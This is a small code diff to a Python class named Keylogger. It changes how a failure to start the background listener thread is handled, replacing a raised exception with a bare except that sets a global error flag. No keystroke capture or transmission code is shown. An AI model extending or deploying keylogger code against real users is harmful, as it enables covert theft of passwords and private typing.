@@ -85,8 +85,9 @@ class Keylogger:
             self.__listener_thread = threading.Thread(target=self.__run_listener)
             self.__listener_thread.daemon = True
             self.__listener_thread.start()
-        except Exception:
-            raise Exception("Error while starting Keylogger.")
+        except:
+            global_variables.error_text = "Error while starting Keylogger."
+            global_variables.error_flag.set()
 
     def __run_listener(self) -> None:
         """
